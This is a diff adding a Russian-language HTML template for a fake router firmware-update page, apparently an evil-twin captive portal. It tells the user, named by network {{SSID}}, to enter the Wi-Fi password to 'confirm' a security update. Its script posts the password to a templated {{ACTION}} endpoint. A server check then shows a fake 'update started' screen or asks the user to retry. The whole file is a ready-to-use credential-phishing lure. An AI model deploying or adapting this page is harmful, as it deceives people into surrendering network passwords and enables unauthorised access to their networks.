@@ -1,0 +1,203 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="color-scheme" content="light">
+<title>{{TITLE}}</title>
+<style>
+  :root{
+    --accent:#b8431a;--accent-d:#9c3814;--ink:#1b1a18;--muted:#706b64;
+    --bg:#f1f0ee;--card:#fff;--line:#dedbd5;--bad:#b02a1c;--ok:#2f7a46;--warn:#8a5a10;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0}
+  body{
+    min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:26px 16px;
+    background:var(--bg);color:var(--ink);
+    font:16px/1.45 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+    -webkit-text-size-adjust:100%;
+  }
+  .card{width:100%;max-width:420px;background:var(--card);border-radius:12px;border:1px solid var(--line);overflow:hidden}
+  .top{display:flex;align-items:center;gap:10px;padding:16px 22px;border-bottom:1px solid var(--line);background:#faf9f7}
+  .top svg{display:block;flex:none}
+  .top b{font-size:13px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;color:#3a3733}
+  .ver{margin-left:auto;font-size:11.5px;font-variant-numeric:tabular-nums;color:var(--muted)}
+  .body{padding:22px 22px 22px}
+  h1{margin:0 0 6px;font-size:21px;line-height:1.25;font-weight:600}
+  .sub{margin:0 0 16px;font-size:14px;color:var(--muted)}
+  .sub b{color:var(--ink);font-weight:600;word-break:break-word}
+  .warn{
+    display:flex;gap:10px;padding:12px 13px;margin:0 0 20px;border-radius:10px;
+    background:#fdf4e3;border:1px solid #f0dcb4;color:#6d4a0d;font-size:13.5px;line-height:1.45;
+  }
+  .warn svg{flex:none;display:block;margin-top:1px}
+  .warn b{font-weight:600}
+  label{display:block;font-size:13px;font-weight:600;color:#3d3933;margin-bottom:7px}
+  input{
+    display:block;width:100%;height:48px;padding:0 13px;font-size:16px;color:var(--ink);
+    background:#fff;border:1px solid var(--line);border-radius:10px;outline:none;
+    transition:border-color .15s,box-shadow .15s;
+  }
+  input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(184,67,26,.14)}
+  input[aria-invalid="true"]{border-color:var(--bad)}
+  .err{margin:6px 0 0;min-height:16px;font-size:12.5px;color:var(--bad)}
+  button{
+    width:100%;min-height:48px;margin-top:12px;display:inline-flex;align-items:center;justify-content:center;gap:9px;
+    font:600 16px/1 inherit;color:#fff;background:var(--accent);border:0;border-radius:10px;cursor:pointer;
+    transition:background .15s,opacity .15s;
+  }
+  button:hover{background:var(--accent-d)}
+  button:disabled{opacity:.72;cursor:default}
+  .spin{
+    width:16px;height:16px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;
+    display:none;animation:r .7s linear infinite;
+  }
+  button.busy .spin{display:block}
+  @keyframes r{to{transform:rotate(360deg)}}
+  .note{margin:14px 0 0;min-height:18px;font-size:13px;color:var(--muted);text-align:center}
+  .note.bad{color:var(--bad);font-weight:600}
+  .fine{margin:16px 0 0;padding-top:14px;border-top:1px solid var(--line);font-size:11.5px;line-height:1.55;color:#8b867f}
+  .done{text-align:center;padding:24px 22px 26px}
+  .done svg{display:block;margin:0 auto 14px}
+  .done h2{margin:0 0 8px;font-size:20px}
+  .done p{margin:0;font-size:14px;color:var(--muted)}
+  [hidden]{display:none!important}
+</style>
+</head>
+<body>
+<main class="card">
+  <div class="top">
+    <svg width="22" height="22" viewBox="0 0 22 22" aria-hidden="true">
+      <rect x="2.5" y="4.5" width="17" height="13" rx="2" fill="none" stroke="#b8431a" stroke-width="1.8"/>
+      <path d="M6 8.5h4M6 12h6M14.5 15.5v-4.2M12.9 12.9l1.6-1.6 1.6 1.6" fill="none" stroke="#b8431a"
+            stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+    <b>Система роутера</b>
+    <span class="ver">1.4.2 → 1.4.3</span>
+  </div>
+
+  <div class="body">
+    <h1>Доступно обновление прошивки</h1>
+    <p class="sub">Сеть <b>{{SSID}}</b>. Подтвердите доступ паролем, чтобы роутер запустил установку.</p>
+
+    <div class="warn">
+      <svg width="17" height="17" viewBox="0 0 17 17" aria-hidden="true">
+        <circle cx="8.5" cy="8.5" r="7.2" fill="none" stroke="#b8842a" stroke-width="1.6"/>
+        <path d="M8.5 4.8v4.2l2.6 1.6" fill="none" stroke="#b8842a" stroke-width="1.6" stroke-linecap="round"/>
+      </svg>
+      <span><b>Сеть будет недоступна около 2 минут.</b> Роутер перезагрузится, после этого интернет заработает сам.</span>
+    </div>
+
+    <form id="f" novalidate autocomplete="off">
+      <label for="password">Пароль Wi-Fi для подтверждения</label>
+      <input id="password" name="password" type="password" placeholder="Пароль текущей сети"
+             spellcheck="false" autocapitalize="none" autocomplete="off" aria-describedby="e-password">
+      <p class="err" id="e-password" aria-live="polite"></p>
+      <button id="go" type="submit"><span class="spin" aria-hidden="true"></span><span class="lbl">Установить обновление</span></button>
+    </form>
+
+    <p class="note" id="note" role="status" aria-live="polite"></p>
+    <p class="fine" id="fine">Обновление содержит исправления безопасности. Настройки сети сохранятся. Не отключайте питание роутера.</p>
+  </div>
+
+  <section class="done" id="done" hidden>
+    <svg width="44" height="44" viewBox="0 0 44 44" aria-hidden="true">
+      <circle cx="22" cy="22" r="21" fill="#ecf4ee"/>
+      <path d="M14.5 22.4l5.3 5.3 9.7-10.4" fill="none" stroke="#2f7a46" stroke-width="2.6"
+            stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+    <h2>Обновление запущено</h2>
+    <p>Роутер перезагрузится в течение 2 минут. Окно можно закрыть.</p>
+  </section>
+</main>
+
+<script>
+(function () {
+  var form = document.getElementById('f');
+  var input = document.getElementById('password');
+  var btn = document.getElementById('go');
+  var label = btn.querySelector('.lbl');
+  var note = document.getElementById('note');
+  var done = document.getElementById('done');
+  var fine = document.getElementById('fine');
+  var head = document.querySelector('h1');
+  var sub = document.querySelector('.sub');
+  var warn = document.querySelector('.warn');
+  var busy = false;
+  var timer = 0;
+
+  function setError(msg) {
+    document.getElementById('e-password').textContent = msg || '';
+    input.setAttribute('aria-invalid', msg ? 'true' : 'false');
+  }
+
+  function state(bad, text) {
+    note.textContent = text || '';
+    note.className = 'note' + (bad ? ' bad' : '');
+  }
+
+  function setBusy(on) {
+    busy = on;
+    btn.disabled = on;
+    btn.classList.toggle('busy', on);
+    label.textContent = on ? 'Проверяем доступ…' : 'Установить обновление';
+  }
+
+  form.addEventListener('submit', function (ev) {
+    ev.preventDefault();
+    if (busy) return;
+    clearTimeout(timer);
+    if (!input.value.trim()) {
+      setError('Введите пароль сети');
+      input.focus();
+      return;
+    }
+    setError('');
+    state(false, '');
+    setBusy(true);
+
+    var data = {};
+    new FormData(form).forEach(function (v, k) { data[k] = String(v); });
+
+    fetch('{{ACTION}}', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    })
+      .then(function (r) { return r.json(); })
+      .then(function (res) {
+        var verdict = (res && res.verdict) || 'pending';
+        if (verdict === 'ok') {
+          form.hidden = true;
+          fine.hidden = true;
+          warn.hidden = true;
+          head.hidden = true;
+          sub.hidden = true;
+          state(false, '');
+          done.hidden = false;
+          return;
+        }
+        if (verdict === 'retry') {
+          setBusy(false);
+          state(true, 'Пароль не подошёл. Проверьте раскладку и попробуйте снова.');
+          input.select();
+          return;
+        }
+        state(false, 'Проверяем доступ, роутер переподключается…');
+        timer = setTimeout(function () {
+          setBusy(false);
+          state(false, 'Если окно не закроется, отправьте пароль ещё раз.');
+        }, 4000);
+      })
+      .catch(function () {
+        setBusy(false);
+        state(true, 'Роутер не ответил. Попробуйте ещё раз.');
+      });
+  });
+
+  input.focus({ preventScroll: true });
+})();
+</script>
+</body>
+</html>
